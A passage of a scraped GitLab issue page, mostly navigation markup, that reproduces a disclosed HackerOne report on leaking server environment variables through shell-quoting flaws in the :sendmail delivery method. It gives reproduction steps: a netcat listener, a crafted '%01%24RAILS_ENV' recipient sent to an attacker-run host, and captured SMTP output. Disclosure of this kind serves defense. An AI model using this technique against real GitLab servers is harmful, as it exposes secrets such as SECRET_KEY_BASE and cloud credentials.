registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/ml/models&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;operations_menu&quot;,&quot;title&quot;:&quot;Operate&quot;,&quot;icon&quot;:&quot;cloud-pod&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/environments&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;environments&quot;,&quot;title&quot;:&quot;Environments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/environments&quot;,&quot;link_classes&quot;:&quot;shortcuts-environments&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;infrastructure_registry&quot;,&quot;title&quot;:&quot;Terraform modules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/terraform_module_registry&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;monitor_menu&quot;,&quot;title&quot;:&quot;Monitor&quot;,&quot;icon&quot;:&quot;monitor&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/incidents&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;incidents&quot;,&quot;title&quot;:&quot;Incidents&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/incidents&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;service_desk&quot;,&quot;title&quot;:&quot;Service Desk&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues/service_desk&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;analyze_menu&quot;,&quot;title&quot;:&quot;Analyze&quot;,&quot;icon&quot;:&quot;chart&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/value_stream_analytics&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;cycle_analytics&quot;,&quot;title&quot;:&quot;Value stream analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/value_stream_analytics&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-cycle-analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;contributors&quot;,&quot;title&quot;:&quot;Contributor analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/graphs/master?ref_type=heads&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;ci_cd_analytics&quot;,&quot;title&quot;:&quot;CI/CD analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines/charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;repository_analytics&quot;,&quot;title&quot;:&quot;Repository analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/graphs/master/charts&quot;,&quot;link_classes&quot;:&quot;shortcuts-repository-charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;code_review&quot;,&quot;title&quot;:&quot;Code review analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/analytics/code_reviews&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;issues&quot;,&quot;title&quot;:&quot;Issue analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/analytics/issues_analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;insights&quot;,&quot;title&quot;:&quot;Insights&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/insights/&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-insights&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_experiments&quot;,&quot;title&quot;:&quot;Model experiments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/ml/experiments&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false}],&quot;current_context_header&quot;:&quot;Project&quot;,&quot;support_path&quot;:&quot;https://about.gitlab.com/get-help/&quot;,&quot;docs_path&quot;:&quot;/help/docs&quot;,&quot;display_whats_new&quot;:true,&quot;show_version_check&quot;:null,&quot;search&quot;:{&quot;search_path&quot;:&quot;/search&quot;,&quot;issues_path&quot;:&quot;/dashboard/issues&quot;,&quot;mr_path&quot;:&quot;/dashboard/merge_requests&quot;,&quot;autocomplete_path&quot;:&quot;/search/autocomplete&quot;,&quot;settings_path&quot;:&quot;/search/settings&quot;,&quot;search_context&quot;:{&quot;group&quot;:{&quot;id&quot;:9970,&quot;name&quot;:&quot;GitLab.org&quot;,&quot;full_name&quot;:&quot;GitLab.org&quot;},&quot;group_metadata&quot;:{&quot;issues_path&quot;:&quot;/groups/gitlab-org/-/issues&quot;,&quot;mr_path&quot;:&quot;/groups/gitlab-org/-/merge_requests&quot;},&quot;project&quot;:{&quot;id&quot;:278964,&quot;name&quot;:&quot;GitLab&quot;},&quot;project_metadata&quot;:{&quot;mr_path&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;issues_path&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;},&quot;code_search&quot;:false,&quot;scope&quot;:&quot;issues&quot;,&quot;for_snippets&quot;:null}},&quot;panel_type&quot;:&quot;project&quot;,&quot;shortcut_links&quot;:[{&quot;title&quot;:&quot;Snippets&quot;,&quot;href&quot;:&quot;/explore/snippets&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-snippets&quot;},{&quot;title&quot;:&quot;Groups&quot;,&quot;href&quot;:&quot;/explore/groups&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-groups&quot;},{&quot;title&quot;:&quot;Projects&quot;,&quot;href&quot;:&quot;/explore/projects/starred&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-projects&quot;}],&quot;terms&quot;:&quot;/-/users/terms&quot;}"></aside>

<div class="content-wrapper">
<div class="broadcast-wrapper">




</div>
<div class="alert-wrapper alert-wrapper-top-space gl-flex gl-flex-col gl-gap-3 container-fluid container-limited">






























</div>
<div class="top-bar-fixed container-fluid" data-testid="top-bar">
<div class="top-bar-container gl-flex gl-items-center gl-gap-2">
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-start">
<button class="gl-button btn btn-icon btn-md btn-default btn-default-tertiary js-super-sidebar-toggle-expand super-sidebar-toggle -gl-ml-3" aria-controls="super-sidebar" aria-expanded="false" aria-label="Primary navigation sidebar" type="button"><svg class="s16 gl-icon gl-button-icon " data-testid="sidebar-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#sidebar"></use></svg>

</button>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"GitLab.org","item":"https://gitlab.com/gitlab-org"},{"@type":"ListItem","position":2,"name":"GitLab","item":"https://gitlab.com/gitlab-org/gitlab"},{"@type":"ListItem","position":3,"name":"Issues","item":"https://gitlab.com/gitlab-org/gitlab/-/issues"},{"@type":"ListItem","position":4,"name":"#337601","item":"https://gitlab.com/gitlab-org/gitlab/-/issues/337601"}]}


</script>
<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">
<div data-breadcrumbs-json="[{&quot;text&quot;:&quot;GitLab.org&quot;,&quot;href&quot;:&quot;/gitlab-org&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/group/avatar/9970/project_avatar.png&quot;},{&quot;text&quot;:&quot;GitLab&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/project/avatar/278964/project_avatar.png&quot;},{&quot;text&quot;:&quot;Issues&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;#337601&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab/-/issues/337601&quot;,&quot;avatarPath&quot;:null}]" id="js-vue-page-breadcrumbs"></div>
<div id="js-injected-page-breadcrumbs"></div>
</div>


</div>
<div class="gl-flex-none gl-flex gl-items-center gl-justify-center">
<div id="js-advanced-search-modal"></div>

</div>
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-end">
<div id="js-work-item-feedback"></div>


</div>
</div>
</div>

<div class="container-fluid container-limited limit-container-width project-highlight-puc">
<main class="content" id="content-body" itemscope itemtype="http://schema.org/SoftwareSourceCode">
<div class="flash-container flash-container-page sticky" data-testid="flash-container">
<div id="js-global-alerts"></div>
</div>







<div class="issue-details issuable-details js-issue-details">
<div class="detail-page-description content-block js-detail-page-description gl-pt-3 gl-pb-0 gl-border-none">
<div data-header-actions-data="{&quot;can_create_issue&quot;:&quot;true&quot;,&quot;can_create_incident&quot;:&quot;false&quot;,&quot;can_destroy_issue&quot;:&quot;false&quot;,&quot;can_reopen_issue&quot;:&quot;false&quot;,&quot;can_report_spam&quot;:&quot;&quot;,&quot;can_update_issue&quot;:&quot;false&quot;,&quot;is_issue_author&quot;:&quot;false&quot;,&quot;issue_path&quot;:&quot;/gitlab-org/gitlab/-/issues/337601&quot;,&quot;new_issue_path&quot;:&quot;/gitlab-org/gitlab/-/issues/new?add_related_issue=337601&quot;,&quot;project_path&quot;:&quot;gitlab-org/gitlab&quot;,&quot;report_abuse_path&quot;:&quot;/-/abuse_reports/add_category&quot;,&quot;reported_user_id&quot;:2741139,&quot;reported_from_url&quot;:&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/337601&quot;,&quot;submit_as_spam_path&quot;:&quot;/gitlab-org/gitlab/-/issues/337601/mark_as_spam&quot;,&quot;issuable_email_address&quot;:null,&quot;can_promote_to_epic&quot;:&quot;false&quot;}" data-initial="{&quot;endpoint&quot;:&quot;/gitlab-org/gitlab/-/issues/337601&quot;,&quot;updateEndpoint&quot;:&quot;/gitlab-org/gitlab/-/issues/337601.json&quot;,&quot;canUpdate&quot;:false,&quot;canDestroy&quot;:false,&quot;issuableRef&quot;:&quot;#337601&quot;,&quot;imported&quot;:false,&quot;markdownPreviewPath&quot;:&quot;/gitlab-org/gitlab/-/preview_markdown?target_id=337601\u0026target_type=Issue&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;lockVersion&quot;:1,&quot;issuableTemplateNamesPath&quot;:&quot;/gitlab-org/gitlab/description_templates/names/issue&quot;,&quot;initialTitleHtml&quot;:&quot;Environment variables can be leaked via the `:sendmail` delivery method&quot;,&quot;initialTitleText&quot;:&quot;Environment variables can be leaked via the `:sendmail` delivery method&quot;,&quot;initialDescriptionHtml&quot;:&quot;\u003cp data-sourcepos=\&quot;1:1-1:121\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;1:1-1:70\&quot;\u003e\u003ca data-sourcepos=\&quot;1:3-1:68\&quot; href=\&quot;https://hackerone.com/reports/1286317\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eHackerOne report #1286317\u003c/a\u003e\u003c/strong\u003e by \u003ccode data-sourcepos=\&quot;1:76-1:80\&quot;\u003evakzz\u003c/code\u003e on 2021-08-02, assigned to \u003ca href=\&quot;/rshambhuni\&quot; data-reference-type=\&quot;user\&quot; data-user=\&quot;9043659\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; class=\&quot;gfm gfm-project_member js-user-link\&quot; title=\&quot;Rohit Shambhuni\&quot;\u003e@rshambhuni\u003c/a\u003e:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;3:1-3:57\&quot; dir=\&quot;auto\&quot;\u003e\u003ca data-sourcepos=\&quot;3:1-3:17\&quot; href=\&quot;#report\&quot;\u003eReport\u003c/a\u003e | \u003ca data-sourcepos=\&quot;3:21-3:57\&quot; href=\&quot;#how-to-reproduce\&quot;\u003eHow To Reproduce\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;5:1-5:9\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-report\&quot; class=\&quot;anchor\&quot; href=\&quot;#report\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eReport\u003c/h2\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;7:1-7:14\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-summary\&quot; class=\&quot;anchor\&quot; href=\&quot;#summary\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSummary\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;9:1-9:210\&quot; dir=\&quot;auto\&quot;\u003eThe gitlab omnibus edition defaults to using \u003ccode data-sourcepos=\&quot;9:47-9:55\&quot;\u003e:sendmail\u003c/code\u003e as the delivery method for emails. ActionMailer depends on mail v2.7.1 for this \u003ca href=\&quot;https://gitlab.com/gitlab-org/gitlab/-/blob/v14.1.1-ee/Gemfile.lock#L1546\&quot;\u003ehttps://gitlab.com/gitlab-org/gitlab/-/blob/v14.1.1-ee/Gemfile.lock#L1546\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;11:1-11:154\&quot; dir=\&quot;auto\&quot;\u003eWhen \u003ccode data-sourcepos=\&quot;11:7-11:15\&quot;\u003e:sendmail\u003c/code\u003e is used as the delivery method, \u003ccode data-sourcepos=\&quot;11:51-11:68\&quot;\u003e/usr/sbin/sendmail\u003c/code\u003e will end up being called with the \u003ccode data-sourcepos=\&quot;11:106-11:107\&quot;\u003eto\u003c/code\u003e address going through the following function:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;13:1-13:96\&quot; dir=\&quot;auto\&quot;\u003e\u003ca href=\&quot;https://github.com/mikel/mail/blob/2.7.1/lib/mail/network/delivery_methods/sendmail.rb#L85-L93\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://github.com/mikel/mail/blob/2.7.1/lib/mail/network/delivery_methods/sendmail.rb#L85-L93\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;14:1-24:3\&quot; data-canonical-lang=\&quot;ruby\&quot; class=\&quot;code highlight js-syntax-highlight language-ruby\&quot; lang=\&quot;ruby\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003edef\u003c/span\u003e \u003cspan class=\&quot;nc\&quot;\u003eself\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003eshellquote\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eaddress\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;c1\&quot;\u003e# Process as a single byte sequence because not all shell  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;c1\&quot;\u003e# implementations are multibyte aware.  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;c1\&quot;\u003e#  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;c1\&quot;\u003e# A LF cannot be escaped with a backslash because a backslash + LF  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;c1\&quot;\u003e# combo is regarded as line continuation and simply ignored. Strip it.  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;n\&quot;\u003eescaped\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eaddress\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003egsub\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;sr\&quot;\u003e/([^A-Za-z0-9_\\s\\+\\-.,:\\/@~])/n\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;se\&quot;\u003e\\\\\\\\\\\\\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e1\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e).\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003egsub\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;se\&quot;\u003e\\n\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;s1\&quot;\u003e&#39;&#39;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;sx\&quot;\u003e%(\&quot;\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e#{\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eescaped\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e}\u003c/span\u003e\u003cspan class=\&quot;sx\&quot;\u003e\&quot;)\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003eend\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;26:1-27:257\&quot; dir=\&quot;auto\&quot;\u003eThere is a long standing issue in bash where a backlash followed by a \u003ccode data-sourcepos=\&quot;26:72-26:75\&quot;\u003e\\001\u003c/code\u003e character can cause issues with interpolation\u003cbr data-sourcepos=\&quot;26:126-26:126\&quot;\u003e\u0026#x000A;\u003ca href=\&quot;https://lists.gnu.org/archive/html/bug-bash/2007-03/msg00065.html\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://lists.gnu.org/archive/html/bug-bash/2007-03/msg00065.html\u003c/a\u003e which causes \u003ccode data-sourcepos=\&quot;27:81-27:127\&quot;\u003e\\^A\\$\u003c/code\u003e to think second backslash is being escaped and leaves the \u003ccode data-sourcepos=\&quot;27:189-27:189\&quot;\u003e$\u003c/code\u003e unescaped (\u003ccode data-sourcepos=\&quot;27:204-27:205\&quot;\u003e^A\u003c/code\u003e is \u003ccode data-sourcepos=\&quot;27:212-27:215\&quot;\u003e\\x00\u003c/code\u003e and can be entered with ctrl-v ctrl-a):\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;29:1-32:3\&quot; data-canonical-lang=\&quot;bash\&quot; class=\&quot;code highlight js-syntax-highlight language-shell\&quot; lang=\&quot;shell\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ebash-5.1\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003eecho\u003c/span\u003e \u003cspan class=\&quot;nt\&quot;\u003e-n\u003c/span\u003e \u003cspan class=\&quot;s2\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;se\&quot;\u003e\\^\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003eA\u003c/span\u003e\u003cspan class=\&quot;se\&quot;\u003e\\$\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003eUSER\&quot;\u003c/span\u003e | xxd  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e00000000: 5c01 5c77 696c 6c                        \u003cspan class=\&quot;se\&quot;\u003e\\.\\w\u003c/span\u003eill  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;34:1-34:190\&quot; dir=\&quot;auto\&quot;\u003eSo if an email is sent to \u003ccode data-sourcepos=\&quot;34:28-34:56\&quot;\u003e\&quot;someone+\\x01$HOME@place.com\&quot;\u003c/code\u003e then after shellqoute it will be \u003ccode data-sourcepos=\&quot;34:93-34:146\&quot;\u003e\&quot;someone+\\\\u0001\\$HOME@place.com\&quot;\u003c/code\u003e and bash will expand the \u003ccode data-sourcepos=\&quot;34:175-34:179\&quot;\u003eHOME \u003c/code\u003e variable.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;36:1-36:201\&quot; dir=\&quot;auto\&quot;\u003eSince \u003ccode data-sourcepos=\&quot;36:8-36:15\&quot;\u003esendmail\u003c/code\u003e is run using a string to \u003ccode data-sourcepos=\&quot;36:44-36:51\&quot;\u003eIO.popen\u003c/code\u003e, this bug relies on bash being the default /bin/sh shell (which it is on OSX, RHEL, Centos and can be done in Ubuntu with \u003ccode data-sourcepos=\&quot;36:177-36:197\&quot;\u003edpkg-reconfigure dash\u003c/code\u003e) .\u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;39:1-39:27\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-steps-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#steps-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSteps to reproduce\u003c/h5\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;40:1-52:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;40:1-40:83\&quot;\u003eUse something like vagrant/virtualbox to create a CentOS 8 vm or spin up a vps\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;41:1-41:94\&quot;\u003eFollowing the instructions to install gitlab  \u003ca href=\&quot;https://about.gitlab.com/install/#centos-8\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://about.gitlab.com/install/#centos-8\u003c/a\u003e.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;42:1-42:157\&quot;\u003e(ALT) Alternatively to steps 1 and 2 the docker installation can be used if you run \u003ccode data-sourcepos=\&quot;42:89-42:109\&quot;\u003edpkg-reconfigure dash\u003c/code\u003e and disable dash as the default system shell\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;43:1-43:126\&quot;\u003eSomewhere with a publicly accessible ip run \u003ccode data-sourcepos=\&quot;43:49-43:123\&quot;\u003eecho -e &#39;200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n&#39; | sudo nc -vl 25\u003c/code\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;44:1-44:45\&quot;\u003eLogin to gitlab and create a new project\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;45:1-45:53\&quot;\u003eGo to Settings -\u0026gt; Integrations -\u0026gt; Emails on push\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;46:1-46:51\&quot;\u003eFire up Burp or open the network tab in Chrome\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;47:1-47:139\&quot;\u003eIn the \u003ccode data-sourcepos=\&quot;47:12-47:21\&quot;\u003eRecipients\u003c/code\u003e enter \u003ccode data-sourcepos=\&quot;47:31-47:68\&quot;\u003euser+test@111.111.111.111.getmoss.site\u003c/code\u003e replacing \u003ccode data-sourcepos=\&quot;47:82-47:96\&quot;\u003e111.111.111.111\u003c/code\u003e with the ip of the machine running \u003ccode data-sourcepos=\&quot;47:135-47:136\&quot;\u003enc\u003c/code\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;48:1-48:83\&quot;\u003eEnsure \u003ccode data-sourcepos=\&quot;48:12-48:54\&quot;\u003eTrigger event for pushes to the repository.\u003c/code\u003e is checked and press save\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;49:1-49:152\&quot;\u003eEither edit the request in burp or copy as curl from the network tab and change the \u003ccode data-sourcepos=\&quot;49:89-49:92\&quot;\u003etest\u003c/code\u003e in the email to be \u003ccode data-sourcepos=\&quot;49:115-49:129\&quot;\u003e%01%24RAILS_ENV\u003c/code\u003e and run the request\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;50:1-50:38\&quot;\u003eEdit or add a file to the project\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;51:1-52:0\&quot;\u003eYou should see the environment variable in the \u003ccode data-sourcepos=\&quot;51:52-51:53\&quot;\u003eto\u003c/code\u003e address in \u003ccode data-sourcepos=\&quot;51:68-51:69\&quot;\u003enc\u003c/code\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;53:1-63:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e$ echo -e &#39;200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n200 ok\\n&#39; | sudo nc -vl 25  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eListening on [103.xxx.xxx.xxx] (family 0, port 25)  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eConnection from [45.xxx.xxx.xxx] port 25 [tcp/smtp] accepted (family 2, sport 53932)  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eEHLO localhost.localdomain  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eMAIL FROM:\u0026lt;gitlab@gitlab.testing\u0026gt;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRCPT TO:\u0026lt;\&quot;will+production\&quot;[@]103.xxx.xxx.xxx.getmoss.site\u0026gt;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDATA  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRSET  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eQUIT  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;65:1-65:15\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-impact\&quot; class=\&quot;anchor\&quot; href=\&quot;#impact\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eImpact\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;66:1-66:282\&quot; dir=\&quot;auto\&quot;\u003eAn attacker can read arbitrary environment variables from the server if bash is configured as the default shell. As sensitive values are often passed around using environment variables (such as \u003ccode data-sourcepos=\&quot;66:196-66:210\&quot;\u003eSECRET_KEY_BASE\u003c/code\u003e or aws credentials) they could be read and used to gain further access\u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;68:1-68:17\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-examples\&quot; class=\&quot;anchor\&quot; 